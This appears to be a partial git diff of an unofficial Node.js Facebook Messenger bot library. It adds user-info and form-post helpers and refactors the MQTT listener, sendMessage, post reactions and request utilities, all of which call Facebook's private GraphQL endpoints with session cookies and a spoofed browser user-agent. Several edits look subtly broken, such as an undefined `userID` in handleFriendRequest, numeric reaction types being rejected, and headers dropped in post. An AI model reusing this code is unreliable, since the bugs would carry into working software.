+    }),
+    "doc_id": 5092283120862795
+}
+try {
+        defaultFuncs
+            .post("https://www.facebook.com/api/graphql/", ctx.jar, form)
+            .then(utils.parseAndCheckLogin(ctx, defaultFuncs))
+            .then(function (resData) {
+            if (resData.error) throw resData;
+                switch (full) {
+                    case true:
+                        callback(null, resData[0].data.node.timeline_list_feed_units.edges[0].node);
+                        break;
+                    case false:
+                        callback(null, resData[0].data.node.timeline_list_feed_units.edges[0].node.comet_sections.context_layout.story.comet_sections.actor_photo.story.actors[0]);
+                        break;
+                    default: 
+                throw {error: "getUserInfoV3: full must be a boolean"};
+                }
+            })
+            .catch(function (err) {
+                log.error("getUserInfo", "Lá»—i: getUserInfo Maybe You Spam Too Much!,Try Again !");
+                return callback(err);
+            });
+    }
+    catch (e) {
+        return callback(null, e);
+    }
+    return returnPromise;
+    };
+};
diff --git a/src/getUserInfoV4.js b/src/getUserInfoV4.js
new file mode 100644
index 000000000..7a5440e0f
--- /dev/null
+++ b/src/getUserInfoV4.js
@@ -0,0 +1,55 @@
+/* eslint-disable linebreak-style */
+"use strict";
+
+var utils = require("../utils");
+var log = require("npmlog");
+
+
+module.exports = function (defaultFuncs, api, ctx) {
+    return function getUserInfoV4(id, callback) {
+        var resolveFunc = function () { };
+        var rejectFunc = function () { };
+        var returnPromise = new Promise(function (resolve, reject) {
+            resolveFunc = resolve;
+            rejectFunc = reject;
+        });
+    
+        if (!callback) {
+            callback = function (err, userInfo) {
+            if (err) return rejectFunc(err);
+            resolveFunc(userInfo);
+            };
+        }
+
+        if (utils.getType(id) !== "Array") id = [id];
+
+    var form = {
+        av: ctx.userID,
+        fb_api_caller_class: "RelayModern",
+        fb_api_req_friendly_name: "PresenceStatusProviderSubscription_ContactProfilesQuery",
+        variables: JSON.stringify({
+            ids: id
+        }),
+        doc_id: 7188178894556645
+    };
+    console.log(form)
+try {
+        defaultFuncs
+            .post("https://www.facebook.com/api/graphql/", ctx.jar, form)
+            .then(utils.parseAndCheckLogin(ctx, defaultFuncs))
+            .then(function (resData) {
+            if (resData.error) throw resData;
+                callback(null,resData.data.viewer.chat_sidebar_contact_nodes[0])
+            })
+            .catch(function (err) {
+                console.log(err)
+                log.error("getUserInfo", "Error: getUserInfo Maybe You Spam Too Much!,Try Again !");
+                return callback(err);
+            });
+    }
+    catch (e) {
+        return callback(null, e);
+    }
+    return returnPromise;
+    };
+};
diff --git a/src/getUserInfoV5.js b/src/getUserInfoV5.js
new file mode 100644
index 000000000..e615b8e10
--- /dev/null
+++ b/src/getUserInfoV5.js
@@ -0,0 +1,61 @@
+"use strict";
+
+var utils = require("../utils");
+var log = require("npmlog");
+
+
+module.exports = function(defaultFuncs, api, ctx) {
+
+  return function getUserInfoV5GraphQL(id, callback) {
+    var resolveFunc = function(){};
+    var rejectFunc = function(){};
+    var returnPromise = new Promise(function (resolve, reject) {
+      resolveFunc = resolve;
+      rejectFunc = reject;
+    });
+
+    if (utils.getType(callback) != "Function" && utils.getType(callback) != "AsyncFunction") {
+      callback = function (err, data) {
+        if (err) {
+          return rejectFunc(err);
+        }
+        resolveFunc(data);
+      };
+    }
+
+    // `queries` has to be a string. I couldn't tell from the dev console. This
+    // took me a really long time to figure out. I deserve a cookie for this.
+    var form = {
+      queries: JSON.stringify({
+        o0: {
+          // This doc_id is valid as of July 20th, 2020
+          doc_id: "5009315269112105",
+          query_params: {
+            ids: [id]
+          }
+        }
+      }),
+      batch_name: "MessengerParticipantsFetcher"
+    };
+      defaultFuncs
+      .post("https://www.facebook.com/api/graphqlbatch/", ctx.jar, form)
+      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))
+      .then(function(resData) {
+      if (resData.error) {
+        throw resData;
+      }
+      // This returns us an array of things. The last one is the success /
+      // failure one.
+      // @TODO What do we do in this case?
+      if (resData[resData.length - 1].error_results !== 0) {
+        console.error("GetThreadInfo", "You're Getting Paid For Using Too Much !");
+      }
+        callback(null, resData);
+    })
+    .catch(function(err) {
+      log.error("getThreadInfoGraphQL", "Error: getThreadInfoGraphQL Maybe You Spam Too Much, Please Try Again !");
+    return callback(err);
+  });
+    return returnPromise;
+    }
+};
diff --git a/src/handleFriendRequest.js b/src/handleFriendRequest.js
index bdab5c784..98b11350a 100644
--- a/src/handleFriendRequest.js
+++ b/src/handleFriendRequest.js
@@ -22,7 +22,7 @@ module.exports = function (defaultFuncs, api, ctx) {
     }
 
     var form = {
-      viewer_id: ctx.userID,
+      viewer_id: userID,
       "frefs[0]": "jwl",
       floc: "friend_center_requests",
       ref: "/reqs.php",
diff --git a/src/handleMessageRequest.js b/src/handleMessageRequest.js
index f74f5e654..c6e14aec8 100644
--- a/src/handleMessageRequest.js
+++ b/src/handleMessageRequest.js
@@ -3,8 +3,8 @@
 var utils = require("../utils");
 var log = require("npmlog");
 
-module.exports = function (defaultFuncs, api, ctx) {
-  return function handleMessageRequest(threadID, accept, callback) {
+module.exports = function (/** @type {{ post: any; postFormData?: (arg0: string, arg1: any, arg2: any, arg3: {}) => any; get?: (arg0: any, arg1: any) => Promise<any>; }} */ defaultFuncs, /** @type {any} */ api, /** @type {{ jar: any; fb_dtsg?: string; ttstamp?: string; }} */ ctx) {
+  return function handleMessageRequest(/** @type {string | any[]} */ threadID, /** @type {any} */ accept, /** @type {((err: any, data: any) => void) | ((arg0: undefined) => any)} */ callback) {
     if (utils.getType(accept) !== "Boolean") throw { error: "Please pass a boolean as a second argument." };
 
     var resolveFunc = function () { };
@@ -15,7 +15,7 @@ module.exports = function (defaultFuncs, api, ctx) {
     });
 
     if (!callback) {
-      callback = function (err, data) {
+      callback = function (/** @type {any} */ err, /** @type {any} */ data) {
         if (err) return rejectFunc(err);
         resolveFunc(data);
       };
@@ -34,12 +34,12 @@ module.exports = function (defaultFuncs, api, ctx) {
     defaultFuncs
       .post("https://www.facebook.com/ajax/mercury/move_thread.php", ctx.jar, form)
       .then(utils.parseAndCheckLogin(ctx, defaultFuncs))
-      .then(function (resData) {
+      .then(function (/** @type {{ error: any; }} */ resData) {
         if (resData.error) throw resData;
 
         return callback();
       })
-      .catch(function (err) {
+      .catch(function (/** @type {string} */ err) {
         log.error("handleMessageRequest", err);
         return callback(err);
       });
diff --git a/src/httpPostFormData.js b/src/httpPostFormData.js
new file mode 100644
index 000000000..29575f91c
--- /dev/null
+++ b/src/httpPostFormData.js
@@ -0,0 +1,41 @@
+"use strict";
+
+var utils = require("../utils");
+var log = require("npmlog");
+
+module.exports = function(defaultFuncs, api, ctx) {
+  return function httpPostFormData(url, form, callback) {
+    var resolveFunc = function(){};
+    var rejectFunc = function(){};
+
+    var returnPromise = new Promise(function (resolve, reject) {
+      resolveFunc = resolve;
+      rejectFunc = reject;
+    });
+
+    if (!callback && (utils.getType(form) == "Function" || utils.getType(form) == "AsyncFunction")) {
+      callback = form;
+      form = {};
+    }
+
+    form = form || {};
+    
+    
+    callback = callback || function(err, data) {
+        if (err) return rejectFunc(err);
+        resolveFunc(data);
+    };
+
+    defaultFuncs
+      .postFormData(url, ctx.jar, form)
+      .then(function(resData) {
+        callback(null, resData.body.toString());
+      })
+      .catch(function(err) {
+        log.error("httpPostFormData", err);
+        return callback(err);
+      });
+
+    return returnPromise;
+  };
+};
\ No newline at end of file
diff --git a/src/listenMqtt.js b/src/listenMqtt.js
index 4995b3266..0c71c0add 100644
--- a/src/listenMqtt.js
+++ b/src/listenMqtt.js
@@ -7,32 +7,60 @@ var websocket = require('websocket-stream');
 var HttpsProxyAgent = require('https-proxy-agent');
 const EventEmitter = require('events');
 
-
 var identity = function () { };
 var form = {};
 var getSeqID = function () { };
 
-var topics = ["/legacy_web","/webrtc","/rtc_multi","/onevc","/br_sr","/sr_res","/t_ms","/thread_typing","/orca_typing_notifications","/notify_disconnect","/orca_presence","/inbox","/mercury", "/messaging_events", "/orca_message_notifications", "/pp","/webrtc_response"];
-
-/* [ Noti ? ]
-!   "/br_sr", //Notification
-    * => Need to publish /br_sr right after this
-   
-!   "/notify_disconnect",
-    * => Need to publish /messenger_sync_create_queue right after this
-
-!   "/orca_presence",
-    * => Will receive /sr_res right here.
-  */
-
-async function listenMqtt(defaultFuncs, api, ctx, globalCallback) {
+var topics = [
+    "/legacy_web",
+    "/webrtc",
+    "/rtc_multi",
+    "/onevc",
+    "/br_sr", //Notification
+    //Need to publish /br_sr right after this
+    "/sr_res",
+    "/t_ms",
+    "/thread_typing",
+    "/orca_typing_notifications",
+    "/notify_disconnect",
+    //Need to publish /messenger_sync_create_queue right after this
+    "/orca_presence",
+    //Will receive /sr_res right here.
+
+    "/inbox",
+    "/mercury",
+    "/messaging_events",
+    "/orca_message_notifications",
+    "/pp",
+    "/webrtc_response",
+];
+
+function listenMqtt(defaultFuncs, api, ctx, globalCallback) {
     //Don't really know what this does but I think it's for the active state?
     //TODO: Move to ctx when implemented
     var chatOn = ctx.globalOptions.online;
     var foreground = false;
 
     var sessionID = Math.floor(Math.random() * 9007199254740991) + 1;
-    var username = {u: ctx.userID,s: sessionID,chat_on: chatOn,fg: foreground,d: utils.getGUID(),ct: "websocket",aid: "219994525426954", mqtt_sid: "",cp: 3,ecp: 10,st: [],pm: [],dc: "",no_auto_fg: true,gas: null,pack: []};
+    var username = {
+        u: ctx.userID,
+        s: sessionID,
+        chat_on: chatOn,
+        fg: foreground,
+        d: utils.getGUID(),
+        ct: "websocket",
+        //App id from facebook
+        aid: "219994525426954",
+        mqtt_sid: "",
+        cp: 3,
+        ecp: 10,
+        st: [],
+        pm: [],
+        dc: "",
+        no_auto_fg: true,
+        gas: null,
+        pack: []
+    };
     var cookies = ctx.jar.getCookies("https://www.facebook.com").join("; ");
 
     var host;
@@ -57,8 +85,8 @@ async function listenMqtt(defaultFuncs, api, ctx, globalCallback) {
             origin: 'https://www.facebook.com',
             protocolVersion: 13
         },
-        keepalive: 13,
-        reschedulePings: true
+        keepalive: 10,
+        reschedulePings: false
     };
 
     if (typeof ctx.globalOptions.proxy != "undefined") {
@@ -78,24 +106,12 @@ async function listenMqtt(defaultFuncs, api, ctx, globalCallback) {
     });
 
     mqttClient.on('connect', function () {
-        
-const http = require("http");
-    const dashboard = http.createServer(function (request, res) {
-        res.writeHead(200, "OK", { "Content-Type": "text/plain" });
-        res.write("VÃ´ NghÄ©a");
-        res.end();
-    });
-/*
-    ! Chá»‰ DÃ nh Cho Máº¥y Pro Cháº¡y Laptop Hoáº·c PC ThÃ´i =))
-*/
-        dashboard.listen(1000);
-
         topics.forEach(topicsub => mqttClient.subscribe(topicsub));
 
         var topic;
         var queue = {
-            sync_api_version: 11,
-            max_deltas_able_to_process: 100,
+            sync_api_version: 10,
+            max_deltas_able_to_process: 1000,
             delta_batch_size: 500,
             encoding: "JSON",
             entity_fbid: ctx.userID,
@@ -116,19 +132,24 @@ const http = require("http");
         var rTimeout = setTimeout(function () {
             mqttClient.end();
             getSeqID();
-        }, 3000);
+        }, 5000);
 
         ctx.tmsWait = function () {
             clearTimeout(rTimeout);
-            ctx.globalOptions.emitReady ? globalCallback({type: "ready",error: null}) : '';
+            ctx.globalOptions.emitReady ? globalCallback({
+                type: "ready",
+                error: null
+            }) : "";
             delete ctx.tmsWait;
         };
     });
 
     mqttClient.on('message', function (topic, message, _packet) {
-        let jsonMessage = Buffer.from(message).toString('utf-8');
-            try { jsonMessage = JSON.parse(jsonMessage); }
-                catch (e) { jsonMessage = {}; }
+        try {
+            var jsonMessage = JSON.parse(message);
+        } catch (ex) {
+            return log.error("listenMqtt", ex);
+        }
         if (topic === "/t_ms") {
             if (ctx.tmsWait && typeof ctx.tmsWait == "function") ctx.tmsWait();
 
@@ -174,6 +195,7 @@ const http = require("http");
 
     mqttClient.on('close', function () {
         //(function () { globalCallback("Connection closed."); })();
+        // client.end();
     });
 }
 
@@ -585,7 +607,7 @@ module.exports = function (defaultFuncs, api, ctx) {
             .post("https://www.facebook.com/api/graphqlbatch/", ctx.jar, form)
             .then(utils.parseAndCheckLogin(ctx, defaultFuncs))
             .then((resData) => {
-                if (utils.getType(resData) != "Array") throw { error: "ChÆ°a ÄÄƒng Nháº­p ÄÆ°á»£c - Appstate ÄÃ£ Bá»‹ Lá»—i", res: resData };
+                if (utils.getType(resData) != "Array") throw { error: "Not logged in", res: resData };
                 if (resData && resData[resData.length - 1].error_results > 0) throw resData[0].o0.errors;
                 if (resData[resData.length - 1].successful_results === 0) throw { error: "getSeqId: there was no successful_results", res: resData };
                 if (resData[0].o0.data.viewer.message_threads.sync_sequence_id) {
@@ -595,7 +617,7 @@ module.exports = function (defaultFuncs, api, ctx) {
             })
             .catch((err) => {
                 log.error("getSeqId", err);
-                if (utils.getType(err) == "Object" && err.error === "ChÆ°a ÄÄƒng Nháº­p ÄÆ°á»£c - Appstate ÄÃ£ Bá»‹ Lá»—i") ctx.loggedIn = false;
+                if (utils.getType(err) == "Object" && err.error === "Not logged in") ctx.loggedIn = false;
                 return globalCallback(err);
             });
     };
@@ -651,4 +673,4 @@ module.exports = function (defaultFuncs, api, ctx) {
         ctx.firstListen = false;
         return msgEmitter;
     };
-};
\ No newline at end of file
+};
diff --git a/src/markAsSeen.js b/src/markAsSeen.js
index bce694b16..ec4e62e87 100644
--- a/src/markAsSeen.js
+++ b/src/markAsSeen.js
@@ -4,7 +4,7 @@ var utils = require("../utils");
 var log = require("npmlog");
 
 module.exports = function (defaultFuncs, api, ctx) {
-  return function markAsRead(seen_timestamp, callback) {
+  return function markAsSeen(seen_timestamp, callback) {
     if (utils.getType(seen_timestamp) == "Function" ||
       utils.getType(seen_timestamp) == "AsyncFunction") {
       callback = seen_timestamp;
diff --git a/src/sendMessage.js b/src/sendMessage.js
index de659d4cc..9aee38598 100644
--- a/src/sendMessage.js
+++ b/src/sendMessage.js
@@ -1,5 +1,10 @@
 "use strict";
 
+/**
+ * ÄÆ°á»£c Fix Hay LÃ m MÃ u Bá»Ÿi: @HarryWakazaki
+ * 21/4/2022
+*/
+
 var utils = require("../utils");
 var log = require("npmlog");
 var bluebird = require("bluebird");
@@ -125,27 +130,35 @@ module.exports = function (defaultFuncs, api, ctx) {
             } || p
           );
         }, null);
-
         return callback(null, messageInfo);
       })
       .catch(function (err) {
         log.error("sendMessage", err);
         if (utils.getType(err) == "Object" && err.error === "Not logged in.") ctx.loggedIn = false;
-        return callback(err);
+        return callback(err,null);
       });
-  }
+    }
 
   function send(form, threadID, messageAndOTID, callback, isGroup) {
-    // We're doing a query to this to check if the given id is the id of
-    // a user or of a group chat. The form will be different depending
-    // on that.
-    if (utils.getType(threadID) === "Array") sendContent(form, threadID, false, messageAndOTID, callback);
+//Full Fix sendMessage
+  if (utils.getType(threadID) === "Array") sendContent(form, threadID, false, messageAndOTID, callback);
     else {
-      if (utils.getType(isGroup) != "Boolean") sendContent(form, threadID, threadID.length === 15, messageAndOTID, callback);
-      else sendContent(form, threadID, !isGroup, messageAndOTID, callback);
+      var THREADFIX = "ThreadID".replace("ThreadID",threadID); // i cÅ©ng Ä‘Ã´n nÃ¢u
+        if (THREADFIX.length <= 15 || global.Fca.isUser.includes(threadID)) sendContent(form, threadID, !isGroup, messageAndOTID, callback);
+        else if (THREADFIX.length >= 15 && THREADFIX.indexOf(1) != 0 || global.Fca.isThread.includes(threadID)) sendContent(form, threadID, threadID.length === 15, messageAndOTID, callback);
+        else {
+          if (global.Fca.Data.event.isGroup) {
+            sendContent(form, threadID, threadID.length === 15, messageAndOTID, callback);
+            global.Fca.isThread.push(threadID);
+          } 
+          else {
+            sendContent(form, threadID, !isGroup, messageAndOTID, callback);
+            global.Fca.isUser.push(threadID)
+        }
+      }
     }
   }
-
+  
   function handleUrl(msg, form, callback, cb) {
     if (msg.url) {
       form["shareable_attachment[share_type]"] = "100";
@@ -288,7 +301,7 @@ module.exports = function (defaultFuncs, api, ctx) {
       is_spoof_warning: false,
       source: "source:chat:web",
       "source_tags[0]": "source:chat",
-      body: msg.body ? msg.body.toString() : "",
+      body: msg.body ? msg.body.toString().replace("\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f",'   ') : "",
       html_body: false,
       ui_push_phase: "V3",
       status: "0",
@@ -301,7 +314,7 @@ module.exports = function (defaultFuncs, api, ctx) {
       signatureID: utils.getSignatureID(),
       replied_to_message_id: replyToMessage
     };
-
+  
     handleLocation(msg, form, callback, () =>
       handleSticker(msg, form, callback, () =>
         handleAttachment(msg, form, callback, () =>
diff --git a/src/setMessageReaction.js b/src/setMessageReaction.js
index 475f701cc..9d2b52c9d 100644
--- a/src/setMessageReaction.js
+++ b/src/setMessageReaction.js
@@ -97,7 +97,7 @@ module.exports = function (defaultFuncs, api, ctx) {
       .then(function (resData) {
         if (!resData) throw { error: "setReaction returned empty object." };
         if (resData.error) throw resData;
-        callback(null);
+        callback(null); 
       })
       .catch(function (err) {
         log.error("setReaction", err);
diff --git a/src/setPostReaction.js b/src/setPostReaction.js
index 0490c82b0..83fc3e8b4 100644
--- a/src/setPostReaction.js
+++ b/src/setPostReaction.js
@@ -1,64 +1,102 @@
-"use strict";
+/**
+ * @fix by Priyansh
+ * update as Thursday, 15 Octomber 2023
+ * do not remove the author name to get more updates
+ */
 
-var utils = require("../utils");
-var log = require("npmlog");
+ "use strict";
 
-module.exports = function (defaultFuncs, api, ctx) {
-  return function postReaction(postID, type, callback) {
-    var resolveFunc = function () { };
-    var rejectFunc = function () { };
-    var returnPromise = new Promise(function (resolve, reject) {
-      resolveFunc = resolve;
-      rejectFunc = reject;
-    });
-
-    if (!callback) {
-      callback = function (err, data) {
-        if (err) return rejectFunc(err);
-        resolveFunc(data);
-      };
-    }
-
-    var map = {
-      like: 1,
-      heart: 2,
-      wow: 3,
-      haha: 4,
-      sad: 7,
-      angry: 8
-    };
-    if (typeof type != "number") {
-      type = map[type.toLocaleLowerCase()];
-      if (!type) type = 1;
-    }
-    var form = {
-      av: ctx.userID,
-      fb_api_caller_class: "RelayModern",
-      fb_api_req_friendly_name: "UFI2FeedbackReactMutation",
-      //This doc_id is valid as of January 17th, 2020
-      doc_id: "2580813318646067",
-      variables: JSON.stringify({
-        input: {
-          client_mutation_id: "7",
-          actor_id: ctx.userID,
-          feedback_reaction: type
-        },
-        useDefaultActor: true
-      })
-    };
-
-    defaultFuncs
-      .post("https://www.facebook.com/api/graphql/", ctx.jar, form)
-      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))
-      .then(function (resData) {
-        if (resData.error) throw resData;
-        return callback();
-      })
-      .catch(function (err) {
-        log.error("setPostReaction", err);
-        return callback(err);
-      });
-
-    return returnPromise;
-  };
-};
+ var utils = require("../utils");
+ var log = require("npmlog");
+ 
+ function formatData(resData) {
+   return {
+     viewer_feedback_reaction_info: resData.feedback_react.feedback.viewer_feedback_reaction_info,
+     supported_reactions: resData.feedback_react.feedback.supported_reactions,
+     top_reactions: resData.feedback_react.feedback.top_reactions.edges,
+     reaction_count: resData.feedback_react.feedback.reaction_count
+   };
+ }
+ 
+ module.exports = function(defaultFuncs, api, ctx) {
+   return function setPostReaction(postID, type, callback) {
+     var resolveFunc = function(){};
+     var rejectFunc = function(){};
+     var returnPromise = new Promise(function (resolve, reject) {
+       resolveFunc = resolve;
+       rejectFunc = reject;
+     });
+ 
+     if (!callback) {
+       if (utils.getType(type) === "Function" || utils.getType(type) === "AsyncFunction") {
+         callback = type;
+         type = 0;
+       }
+       else {
+         callback = function (err, data) {
+           if (err) {
+             return rejectFunc(err);
+           }
+           resolveFunc(data);
+         };
+       }
+     }
+ 
+     var map = {
+       unlike: 0,
+       like: 1,
+       heart: 2,
+       love: 16,
+       haha: 4,
+       wow: 3,
+       sad: 7,
+       angry: 8
+     };
+     
+     if (utils.getType(type) !== "Number" && utils.getType(type) === "String") {
+       type = map[type.toLowerCase()];
+     }
+     else {
+       throw {
+         error: "setPostReaction: Invalid reaction type"
+       };
+     }
+     
+     var form = {
+       av: ctx.userID,
+       fb_api_caller_class: "RelayModern",
+       fb_api_req_friendly_name: "CometUFIFeedbackReactMutation",
+       doc_id: "4769042373179384",
+       variables: JSON.stringify({
+         input: {
+           actor_id: ctx.userID,
+           feedback_id: (new Buffer.from("feedback:" + postID)).toString("base64"),
+           feedback_reaction: type,
+           feedback_source: "OBJECT",
+           is_tracking_encrypted: true,
+           tracking: [],
+           session_id: "f7dd50dd-db6e-4598-8cd9-561d5002b423",
+           client_mutation_id: Math.round(Math.random() * 19).toString()
+         },
+         useDefaultActor: false,
+         scale: 3
+       })
+     };
+ 
+     defaultFuncs
+       .post("https://www.facebook.com/api/graphql/", ctx.jar, form)
+       .then(utils.parseAndCheckLogin(ctx, defaultFuncs))
+       .then(function(resData) {
+         if (resData.errors) {
+           throw resData;
+         }
+         return callback(null, formatData(resData.data));
+       })
+       .catch(function(err) {
+         log.error("setPostReaction", err);
+         return callback(err);
+       });
+ 
+     return returnPromise;
+   };
+ };
diff --git a/src/threadColors.js b/src/threadColors.js
index 0f3d60b4e..79cfb8b90 100644
--- a/src/threadColors.js
+++ b/src/threadColors.js
@@ -1,41 +1,39 @@
 "use strict";
 
-module.exports = function (_defaultFuncs, _api, _ctx) {
+module.exports = function(_defaultFuncs, _api, _ctx) {
   // Currently the only colors that can be passed to api.changeThreadColor(); may change if Facebook adds more
   return {
-
-    //#region This part is for backward compatibly
-    //trying to match the color one-by-one. kill me plz
-    MessengerBlue: "196241301102133",  //DefaultBlue
-    Viking: "1928399724138152", //TealBlue
-    GoldenPoppy: "174636906462322",  //Yellow
-    RadicalRed: "2129984390566328", //Red
-    Shocking: "2058653964378557", //LavenderPurple
-    FreeSpeechGreen: "2136751179887052", //Green
-    Pumpkin: "175615189761153",  //Orange
-    LightCoral: "980963458735625",  //CoralPink
-    MediumSlateBlue: "234137870477637",  //BrightPurple
-    DeepSkyBlue: "2442142322678320", //AquaBlue
-    BrilliantRose: "169463077092846",  //HotPink
-    //i've tried my best, everything else can't be mapped. (or is it?) -UIRI 2020
-    //#endregion
-
-    DefaultBlue: "196241301102133",
-    HotPink: "169463077092846",
-    AquaBlue: "2442142322678320",
-    BrightPurple: "234137870477637",
-    CoralPink: "980963458735625",
-    Orange: "175615189761153",
-    Green: "2136751179887052",
+    ////MessengerBlue: null,
+    ////Viking: "#44bec7",
+    ////GoldenPoppy: "#ffc300",
+    ////RadicalRed: "#fa3c4c",
+    ////Shocking: "#d696bb",
+    ////PictonBlue: "#6699cc",
+    ////FreeSpeechGreen: "#13cf13",
+    ////Pumpkin: "#ff7e29",
+    ////LightCoral: "#e68585",
+    ////MediumSlateBlue: "#7646ff",
+    ////DeepSkyBlue: "#20cef5",
+    ////Fern: "#67b868",
+    ////Cameo: "#d4a88c",
+    ////BrilliantRose: "#ff5ca1",
+    ////BilobaFlower: "#a695c7"
+    DefaultBlue:    "196241301102133",
+    HotPink:        "169463077092846",
+    AquaBlue:       "2442142322678320",
+    BrightPurple:   "234137870477637",
+    CoralPink:      "980963458735625",
+    Orange:         "175615189761153",
+    Green:          "2136751179887052",
     LavenderPurple: "2058653964378557",
-    Red: "2129984390566328",
-    Yellow: "174636906462322",
-    TealBlue: "1928399724138152",
-    Aqua: "417639218648241",
-    Mango: "930060997172551",
-    Berry: "164535220883264",
-    Citrus: "370940413392601",
-    Candy: "205488546921017",
-    //StarWars:       "809305022860427" Removed.
+    Red:            "2129984390566328",
+    Yellow:         "174636906462322",
+    TealBlue:       "1928399724138152",
+    Aqua:           "417639218648241",
+    Mango:          "930060997172551",
+    Berry:          "164535220883264",
+    Citrus:         "370940413392601",
+    Candy:          "205488546921017",
+    StarWars:       "809305022860427"
   };
-};
+};
\ No newline at end of file
diff --git a/test/testv2.js b/test/testv2.js
new file mode 100644
index 000000000..41a5586af
--- /dev/null
+++ b/test/testv2.js
@@ -0,0 +1,3 @@
+var languageFile = require('../Language/index.json');
+var data = languageFile.find(i => i.Language == "vi");
+console.log(data);
\ No newline at end of file
diff --git a/utils.js b/utils.js
index f450c0c84..38fd09eb7 100644
--- a/utils.js
+++ b/utils.js
@@ -1,34 +1,53 @@
+// @ts-nocheck
+/* eslint-disable no-undef */
+
 /* eslint-disable no-prototype-builtins */
-"use strict";
 
-const bluebird = require("bluebird");
-var request = bluebird.promisify(require("request").defaults({ jar: true }));
-var stream = require("stream");
+"use strict";
+var url = require("url");
 var log = require("npmlog");
+var stream = require("stream");
+var bluebird = require("bluebird");
 var querystring = require("querystring");
-var url = require("url");
+var request = bluebird.promisify(require("request").defaults({ jar: true }));
+
+/**
+ * @param {any} url
+ */
 
 function setProxy(url) {
     if (typeof url == undefined) return request = bluebird.promisify(require("request").defaults({ jar: true }));
     return request = bluebird.promisify(require("request").defaults({ jar: true, proxy: url }));
 }
 
+/**
+ * @param {string | URL} url
+ * @param {{ userAgent: any; }} options
+ * @param {{ region: any; }} [ctx]
+ * @param {undefined} [customHeader]
+ */
+
 function getHeaders(url, options, ctx, customHeader) {
     var headers = {
         "Content-Type": "application/x-www-form-urlencoded",
         Referer: "https://www.facebook.com/",
         Host: url.replace("https://", "").split("/")[0],
         Origin: "https://www.facebook.com",
-        "User-Agent": options.userAgent,
-        Connection: "keep-alive"
+        "user-agent": (options.userAgent || "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36"),
+        Connection: "keep-alive",
+        "sec-fetch-site": 'same-origin',
+        "sec-fetch-mode": 'cors'
     };
     if (customHeader) Object.assign(headers, customHeader);
-
     if (ctx && ctx.region) headers["X-MSGR-Region"] = ctx.region;
 
     return headers;
 }
 
+/**
+ * @param {{ _read: any; _readableState: any; }} obj
+ */
+
 function isReadableStream(obj) {
     return (
         obj instanceof stream.Stream &&
@@ -38,6 +57,14 @@ function isReadableStream(obj) {
     );
 }
 
+/**
+ * @param {any} url
+ * @param {any} jar
+ * @param {{ [x: string]: any; fb_dtsg?: any; jazoest?: any; hasOwnProperty?: any; }} qs
+ * @param {any} options
+ * @param {any} ctx
+ */
+
 function get(url, jar, qs, options, ctx) {
     // I'm still confused about this
     if (getType(qs) === "Object")
@@ -54,13 +81,13 @@ function get(url, jar, qs, options, ctx) {
     };
 
     return request(op).then(function(res) {
-        return res[0];
+        return res;
     });
 }
 
 function post(url, jar, form, options, ctx, customHeader) {
     var op = {
-        headers: getHeaders(url, options, ctx, customHeader),
+        headers: getHeaders(url, options),
         timeout: 60000,
         url: url,
         method: "POST",
@@ -68,12 +95,24 @@ function post(url, jar, form, options, ctx, customHeader) {
         jar: jar,
         gzip: true
     };
-
     return request(op).then(function(res) {
-        return res[0];
+        return res;
     });
 }
 
+/**
+ * @param {any} url
+ * @param {any} jar
+ * @param {{ __user: any; __req: string; __rev: any; __a: number; 
+// __af: siteData.features,
+fb_dtsg: any; jazoest: any; }} form
+ * @param {{ __user: any; __req: string; __rev: any; __a: number; 
+// __af: siteData.features,
+fb_dtsg: any; jazoest: any; }} qs
+ * @param {any} options
+ * @param {any} ctx
+ */
+
 function postFormData(url, jar, form, qs, options, ctx) {
     var headers = getHeaders(url, options, ctx);
     headers["Content-Type"] = "multipart/form-data";
@@ -89,10 +128,15 @@ function postFormData(url, jar, form, qs, options, ctx) {
     };
 
     return request(op).then(function(res) {
-        return res[0];
+        return res;
     });
 }
 
+/**
+ * @param {string | number | any[]} val
+ * @param {number} [len]
+ */
+
 function padZeros(val, len) {
     val = String(val);
     len = len || 2;
@@ -100,6 +144,10 @@ function padZeros(val, len) {
     return val;
 }
 
+/**
+ * @param {any} clientID
+ */
+
 function generateThreadingID(clientID) {
     var k = Date.now();
     var l = Math.floor(Math.random() * 4294967295);
@@ -107,6 +155,10 @@ function generateThreadingID(clientID) {
     return "<" + k + ":" + l + "-" + m + "@mail.projektitan.com>";
 }
 
+/**
+ * @param {string | any[]} data
+ */
+
 function binaryToDecimal(data) {
